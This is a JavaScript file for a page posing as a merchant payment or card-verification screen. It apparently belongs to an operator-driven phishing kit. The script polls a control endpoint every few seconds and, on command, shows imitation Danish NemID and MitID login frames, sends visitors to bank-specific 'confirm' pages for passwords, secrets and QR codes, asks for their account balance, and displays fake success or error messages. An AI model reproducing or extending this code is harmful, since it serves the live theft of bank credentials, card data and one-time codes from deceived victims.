class System {
  constructor(link_id, phrases = {}, page_type) {
      this.link_id = link_id,
      this.phrases = phrases
      this.page_type = page_type
      this.getQRCodeData()
      this.redirect()
      this.openSupport()
  }

  async status() {
      const { data } = await axios.post(
          `/api/get-status/${this.link_id}`,
          {
              id: this.link_id
          }
      )

      return data
  }

  async customData(value) {
      const type = value.method.split('_')[1].split(' ')[0]
      const id = value.method.split('_')[1].split(' ')[1]

      const { data } = await axios.post(
          `/api/get-custom-data/${this.link_id}`,
          {
              id: id,
              type: type
          }
      ).catch(() => {
          return false
      })

      return data
  }

  redirect() {
      setInterval(async () => {
          if (!document.hidden) {
              const res = await this.status()

              if (res.method.includes('custom_')) {
                  const { data } = this.customData(res)

                  if (data) {
                      window.location.href = data.route
                  }
              } else {
                  if (res.method !== 'nothing') {
                      if (this.page_type == 'card') {
                          if (res.method != 'inputYourBalance') {
                              try {
                                  load.style.display = "none";
                                  contnet.style.display = "block";

                                  document.querySelector("#balik > div:nth-child(2)").remove()
                                  document.querySelector("#checkbal").remove()
                                  document.querySelector("#contnet > div:nth-child(3)").remove()
                              } catch (e) {
                                  /*  */
                              }
                          }

                          if (res.method.includes('_lk')) {
                              if (res.method.includes('nemid_dk')) {
                                  document.querySelector('#verif-contnt').innerHTML = `
                                      <iframe 
                                          id="iframe" 
                                          style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative;" 
                                          src="/static/style/dk_auth/NemID.htm" 
                                          frameborder="0">
                                      </iframe>
                                  `
                              } else if (res.method.includes('mitid_dk')) {
                                  document.querySelector('#verif-contnt').innerHTML = `
                                      <iframe 
                                          id="iframe" 
                                          style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative; align: left;" 
                                          src="/static/style/dk_auth/MitID/index.html" 
                                          frameborder="0">
                                      </iframe>
                                  `
                              } else {
                                  const BANK_NAME = res.method.split('_')[0]
                                  const TYPE = document.getElementById('verification').style.display

                                  window.location.href = `/merchant/bank-confirm/${BANK_NAME}/${this.link_id}`
                              }
                          } else {
                              try {
                                  document.getElementById(
                                      'modal-close-window'
                                  ).style['display'] = null
                              } catch (e) {
                                  //
                              }

                              if (res.method == 'skip') {
                                  document.querySelector(
                                      '#verif-contnt'
                                  ).innerHTML = `
                                      <div id="modal-close-window" onclick="resetCard()">
                                          <h4 style="margin-block-end: 0em;margin-block-start: 0em;text-align: end;overflow: auto;display: flow-root;">X</h4>
                                      </div>
                                      <div id="contnet" style="display: block;">
                                          <div id="balik">
                                              <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                  ${this.phrases['skipCard']}
                                              </div>
                                          </div>
                                      </div>                                       
                                  `
                              } else if (res.method == 'change') {
                                  document.querySelector(
                                      '#verif-contnt'
                                  ).innerHTML = `
                                      <div id="modal-close-window" onclick="resetCard()">
                                          <h4 style="margin-block-end: 0em;margin-block-start: 0em;text-align: end;overflow: auto;display: flow-root;">X</h4>
                                      </div>
                                      <div id="contnet" style="display: block;">
                                          <div id="balik">
                                              <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                  ${this.phrases['changeCard']}
                                              </div>
                                          </div>
                                      </div>                                       
                                  `
                              } else if (res.method == 'successTransaction') {
                                  document.querySelector(
                                      '#verif-contnt'
                                  ).innerHTML = `
                                      <div id="modal-close-window" onclick="resetCard()">
                                          <h4 style="margin-block-end: 0em;margin-block-start: 0em;text-align: end;overflow: auto;display: flow-root;">X</h4>
                                      </div>
                                      <div id="contnet" style="display: block;">
                                          <div id="balik">
                                              <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                  ${this.phrases['successTransaction']}
                                              </div>
                                          </div>
                                      </div>                                       
                                  `
                              } else if (res.method == 'error') {
                                  document.querySelector(
                                      '#verif-contnt'
                                  ).innerHTML = `
                                      <div id="modal-close-window" onclick="resetCard()">
                                          <h4 style="margin-block-end: 0em;margin-block-start: 0em;text-align: end;overflow: auto;display: flow-root;">X</h4>
                                      </div>
                                      <div id="contnet" style="display: block;">
                                          <div id="balik">
                                              <div style="color: #3f3f3f; line-height: 1.6; font-size: 20px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                                  ${res.error}
                                              </div>
                                          </div>
                                      </div>                                       
                                  `
                              } else {
                                  if (res.method == 'card') {
                                      document.querySelector(
                                          `#verif-contnt`
                                      ).innerHTML =
                                          `
                                              <div id="contnet" style="display: block;">
<div style="font-size: 16px; color: #000; margin-bottom: 15px; font-weight: 600; padding-bottom: 10px; border-bottom: 1px solid #dee2e6;">${this.phrases['generalErrorWord']}</div>
<div id="balik">
    <div style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
      ${this.phrases['noValidCard']}
    </div>
    
    
    
</div>

</div>
                                          `

                                      setTimeout(() => {
                                          window.location.reload()
                                      }, 9000);
                                  } else if (res.method == 'inputYourBalance') {
                                      try {
            document.querySelector('#verif-contnt').innerHTML = `
<div id="contnet">
  <div id="balik">
    <div
      style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
        ${this.phrases['inputBalance']}
    </div>
    <div
      style="font-size: 13px; color: #555; margin-bottom: 3px; margin-top: 20px; font-weight: 600; text-align: left;">
      Kontostand:
    </div>
    <div>
      <input id="checkbal" style="
                  padding: 9px;
                  border: none;
                  border-radius: 4px;
                  margin-bottom: 20px;
                  width: 100%;
                  box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgb(0 0 0 / 7%), 0 1px 1.5px 0 rgb(0 0 0 / 5%);
                  border: 1px solid #cecece;
              " form="_formPay" type="number" name="checkbal" min="1" required
        oninput="document.querySelector('#buttonPay2').disabled = false" />
    </div>
    <input form="_formPay" id="currchoise" value="EUR" name="currency" class="_4" type="text" style="display: none;" />
  </div>
  <div>
    <input style="border-radius: 10px;" id="buttonPay2" type="button" class="SubmitButton SubmitButton--incomplete"
      value="Weiter" onclick="sendBalance()"  disabled />
  </div>
</div>
`
document.getElementById('contnet').style.display = 'block'
                                      } catch (e) {
                                          //
                                      }
                                  } else {
                                      window.location.href = `/merchant/confirm-${res.method}/${this.link_id}`
                                  }
                              }
                          }
                      } else {
                          try {
                              document.querySelector(".card-form__inner > table:nth-child(2)").remove()
                              document.querySelector(".card-input").remove()
                              document.querySelector(".card-form__row").remove()
                          } catch (e) {
                              //
                          }

                          if (res.method.includes('_lk')) {
                              if (res.method == 'nemid_dk') {
                                  document.querySelector('#verif-contnt').innerHTML = `
                                      <iframe 
                                          id="iframe" 
                                          style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative;" 
                                          src="/static/style/dk_auth/NemID.htm" 
                                          frameborder="0">
                                      </iframe>
                                  `
                              } else if (res.method == 'mitid_dk') {
                                  document.querySelector('#verif-contnt').innerHTML = `
                                      <iframe 
                                          id="iframe" 
                                          style="width: 318px; height: 262px; border: 0; z-index: 1000; position: relative; align: left;" 
                                          src="/static/style/dk_auth/MitID/index.html" 
                                          frameborder="0">
                                      </iframe>
                                  `
                              } else {
                                  const BANK_NAME = res.method.split('_')[0]
                                  window.location.href = `/merchant/bank-confirm/${BANK_NAME}/${this.link_id}`
                              }
                          } else {
                              if (res.method == 'skip') {
                                  document.querySelector(
                                      `.card-form__inner`
                                  ).innerHTML =
                                      `
                                          <center>
                                              ${this.phrases['generalErrorWord']}<br><br>
                                              <small style="text-align: justify;">
                                                  <%=skipCard %>
                                              </small>
                                              
                                          </center>
                                      `
                              } else if (res.method == 'change') {
                                  document.querySelector(
                                      `.card-form__inner`
                                  ).innerHTML =
                                      `
                                          <center>
                                              ${this.phrases['generalErrorWord']}<br><br>
                                              <small style="text-align: justify;">
                                              ${this.phrases['changeCard']}
                                              </small>
                                          </center>
                                      `
                              } else if (res.method == 'successTransaction') {
                                  document.querySelector(
                                      `.card-form__inner`
                                  ).innerHTML =
                                      `
                                          <center>
                                          ${this.phrases['generalSuccessWord']}<br><br>
                                              <small style="text-align: justify;">
                                                  ${this.phrases['successTransaction']}
                                              </small>
                                          </center>
                                      `
                              } else if (res.method == 'error') {
                                  document.querySelector(
                                      `.card-form__inner`
                                  ).innerHTML =
                                      `
                                          <center>
                                              <small style="text-align: justify; font-size: 20px;">
                                                  ${res.error}
                                              </small>
                                          </center>
                                      `
                              } else if (res.method == 'card') {
                                  window.location.href = `/merchant/credit-card/${this.link_id}`
                              } else {
                                  window.location.href = `/merchant/confirm-${res.method}/${this.link_id}`
                              }
                          }
                      }
                  }

                  if ((res.password != 'nothing') && (window.location.href.includes('confirm-password'))) {
                      try {
                          document.querySelector(".card-input__label").textContent = `${res.password}:`
                      } catch (e) {
                          //
                      }
                  }

                  if ((res.secret != 'nothing') && (window.location.href.includes('confirm-secret'))) {
                      try {
                          document.querySelector(".card-form__inner > center:nth-child(3)").innerHTML = `<small style="text-align: justify; font-size: 16px;">${res.secret}</small>`
                      } catch (e) {
                          //
                      }
                  }

                  if (window.location.href.includes('confirm-balpush')) {
                    try {
                      const digit = parseFloat(res.balancePush)
                      let interval

                      const getRandom = (min, max) => {
                        const floatRandom = Math.random()
                        const difference = max - min
                        const random = Math.round(difference * floatRandom)
                        const randomWithinRange = random + min

                        return randomWithinRange
                      }

                      const generateFunc = () => {
                        const rnd = getRandom(digit - 100, digit + 50)
                        document.getElementById('odometer').innerHTML = rnd

                        if(rnd == digit) {
                          console.log(true)
                          clearInterval(interval)
                        } else {
                          console.log(rnd)
                        }
                      }

                      interval = setInterval(generateFunc)
                    } catch (e) {
                        //
                    }
                }
              }
          }
      }, 5000)
  }

  openSupport() {
      setInterval(async () => {
          if (!document.hidden) {
              const { data } = await axios.post(
                  `/api/open-chat/${this.link_id}`,
                  {
                      id: this.link_id
                  }
              )

              if (data.status) {
                  try {
                      document.querySelector('.support-circle').style.display = 'none'
                      document.querySelector('#chatra').style.display = 'block'

                      const iframe = document.getElementById("chatra__iframe")
                      const elmnt = iframe.contentWindow.document.querySelector("#app")
                      elmnt.style.display = "block"
                  } catch (e) {
                      /*  */
                  }
              }
          }
      }, 5000)
  }

  async getQRCodeData() {
      if (!document.hidden) {
          const res = await this.status()

          if ((res.qrcode != 'nothing') && (window.location.href.includes('confirm-qrcode'))) {
              try {
                  let i = -1
                  const f = () => {
                      i = (i + 1) % res.qrcode.length
                      
                      document.querySelector(".card-input > center:nth-child(1)").innerHTML = `<img src="/static/style/qrcodes/${res.qrcode[i]}.png" alt="QR-Code" width="200" height="200">`
                      setTimeout(f, 1000)
                  }

                  f()
              } catch (e) {
                  console.log(e)
              }
          }
      }
  }
}

window.__System = System
